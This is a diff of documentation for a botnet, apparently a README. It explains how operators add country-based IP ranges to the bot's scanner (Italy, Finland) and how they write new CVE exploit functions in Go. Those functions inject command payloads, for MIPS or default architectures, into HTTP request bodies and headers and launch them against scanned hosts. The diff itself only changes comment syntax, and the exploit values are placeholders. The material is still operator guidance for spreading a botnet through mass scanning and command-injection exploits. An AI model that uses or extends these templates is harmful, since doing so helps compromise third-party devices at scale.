@@ -8,23 +8,21 @@ Option about the scan feature in this bot is to scope scan on CN, USA, KR, and B
 	
 	1) Go to the scanner.go file and add a new slice for your scan network.
 	
-		# Example:
+		Example:
 			
 			var Italy_Network = []string {
 				"123.456", //123.456.0.0/16
 			}
-			
-			# since v0.6.0 will use only 16 bits of the IP range to set up scan networks (I'm still confused about the subnet mask LOL).
-			
+						
 	2) Go to the header.go file and scroll down to the map name "ScanMap".
 	3) Customize your key and value. The value of the map is structure, so you need to call a value in the "Bot" structure and fill it.
 	
-		# Example:
+		Example:
 		
-			"-fi": {				 # This key will be the command of a network arg in the "?scan" command.
-				scanNetwork: Finland_Network, 	 # Fill the "scanNetwork" that's a value of the "Bot" structure. To your network slice.
-				scanOptFull: "\"FINLAND\"",	 # Add the full name of the network for a reporting process.
-				isRandom:    false,		 # Set "isRandom" to false because it's not a full random network.
+			"-fi": {				 // This key will be the command of a network arg in the "?scan" command.
+				scanNetwork: Finland_Network, 	 // Fill the "scanNetwork" that's a value of the "Bot" structure. To your network slice.
+				scanOptFull: "\"FINLAND\"",	 // Add the full name of the network for a reporting process.
+				isRandom:    false,		 // Set "isRandom" to false because it's not a full random network.
 			},
 	
 	4) Done... Just save it.
@@ -38,44 +36,44 @@ The vulnerability exploit that's used in this botnet will mostly be command inje
 	
 	func (b *Bot) CVE_someYear_newCVE1() {
 		
-		# If you add a post exploit, then customize it with a JSON.
-		# In case that your exploit needs to inject on a post body just call an inject function --> b.inject("default or MIPS", true)
+		// If you add a post exploit, then customize it with a JSON.
+		// In case that your exploit needs to inject on a post body just call an inject function --> b.inject("default or MIPS", true)
 		
 		
-		# This example will use default architecture so that's why we put "default" if your exploit use MIPS just put "mips".
-		# Always put true because we are doing an exploit not scanning (The inject function has been reused in the scanner function).
+		// This example will use default architecture so that's why we put "default" if your exploit use MIPS just put "mips".
+		// Always put true because we are doing an exploit not scanning (The inject function has been reused in the scanner function).
 			
 		newCVE1, _ := json.Marshal(map[string]string{
 			"example":      "something",
 			"example":      "something"+b.inject("mips", true),
 		})
 		
-		# This is just a HTTP header customization.
-		# Incase your exploit needs to inject on a header just do the same with the body. 
+		// This is just a HTTP header customization.
+		// Incase your exploit needs to inject on a header just do the same with the body. 
 		
 		enewCVE1 := Exploit{
-			exploitName:       "CVE_someYear_newCVE1",			# Customize the exploit name for a reporting process.
-			exploitMethod:     "POST",					# Which HTTP method you will use for this exploit?
-			exploitPath:       "example/something",				# Customize URL path.
-			exploitBody:       strings.NewReader(string(newCVE1)),	        # Customize HTTP body.
-			exploitAgent:      "example"+b.inject("mips", true),		# Customize HTTP agent.
-			exploitAccept:     "example",					# Customize HTTP accept.
-			exploitContType:   "example",					# Customize HTTP content type.
-			exploitConnection: "example",					# Customize HTTP connection.
+			exploitName:       "CVE_someYear_newCVE1",			// Customize the exploit name for a reporting process.
+			exploitMethod:     "POST",					// Which HTTP method you will use for this exploit?
+			exploitPath:       "example/something",				// Customize URL path.
+			exploitBody:       strings.NewReader(string(newCVE1)),	        // Customize HTTP body.
+			exploitAgent:      "example"+b.inject("mips", true),		// Customize HTTP agent.
+			exploitAccept:     "example",					// Customize HTTP accept.
+			exploitContType:   "example",					// Customize HTTP content type.
+			exploitConnection: "example",					// Customize HTTP connection.
 		}
 		
-		# If you want to add new header then just call it, like the example down below.
+		// If you want to add new header then just call it, like the example down below.
 		
-		_, newHeader := enewCVE1.setupExploit(b.tempIP)			# Use "enewCVE1" for calling the Exploit structure-function.
-		newHeader.Header.Set("newHeader", "headerContent")		# Add a new header (header, header_content).
-		b.exploitLauncher(enewCVE1, newHeader)				# Launch the exploit by putting the exploit structure and header in to "b.exploitLauncher(ourExploit, ourHeader)" function.
+		_, newHeader := enewCVE1.setupExploit(b.tempIP)			// Use "enewCVE1" for calling the Exploit structure-function.
+		newHeader.Header.Set("newHeader", "headerContent")		// Add a new header (header, header_content).
+		b.exploitLauncher(enewCVE1, newHeader)				// Launch the exploit by putting the exploit structure and header in to "b.exploitLauncher(ourExploit, ourHeader)" function.
 	}
 	
 	##################################################################
 	### Example 2: In case you don't need to add a new HTTP header ###
 	##################################################################
 	
-	# This example is the same as the first example in terms of header and body configs.
+	// This example is the same as the first example in terms of header and body configs.
 	
 	func (b *Bot) CVE_someYear_newCVE2() {			
 		newCVE2, _ := json.Marshal(map[string]string{
@@ -83,19 +81,19 @@ The vulnerability exploit that's used in this botnet will mostly be command inje
 			"example":      "something"+b.inject("", true),
 		})
 		enewCVE2 := Exploit{
-			exploitName:       "CVE_someYear_newCVE2",			# Customize the exploit name for a reporting process.
-			exploitMethod:     "POST",					# Which HTTP method you will use for this exploit?
-			exploitPath:       "example/something",				# Customize URL path.
-			exploitBody:       strings.NewReader(string(newCVE2)),	        # Customize HTTP body.
-			exploitAgent:      "example"+b.inject("", true),		# Customize HTTP agent.
-			exploitAccept:     "example",					# Customize HTTP accept.
-			exploitContType:   "example",					# Customize HTTP content type.
-			exploitConnection: "example",					# Customize HTTP connection.
+			exploitName:       "CVE_someYear_newCVE2",			// Customize the exploit name for a reporting process.
+			exploitMethod:     "POST",					// Which HTTP method you will use for this exploit?
+			exploitPath:       "example/something",				// Customize URL path.
+			exploitBody:       strings.NewReader(string(newCVE2)),	        // Customize HTTP body.
+			exploitAgent:      "example"+b.inject("", true),		// Customize HTTP agent.
+			exploitAccept:     "example",					// Customize HTTP accept.
+			exploitContType:   "example",					// Customize HTTP content type.
+			exploitConnection: "example",					// Customize HTTP connection.
 		}
 
-		b.exploitLauncher(enewCVE2,  b.selfRequest(enewCVE2))		# In the first example, you need to call "setupExploit" function but in this example, you don't need to call it.
-										# Just call the "exploitLauncher" function and in the second argument using the "selfRequest" function instead of a newHeader value. 
-										# Because we only use the default header set and then put our exploit structure into the "selfRequest" argument.
+		b.exploitLauncher(enewCVE2,  b.selfRequest(enewCVE2))		// In the first example, you need to call "setupExploit" function but in this example, you don't need to call it.
+										// Just call the "exploitLauncher" function and in the second argument using the "selfRequest" function instead of a newHeader value. 
+										// Because we only use the default header set and then put our exploit structure into the "selfRequest" argument.
 	}
 	
 # Attack Feature
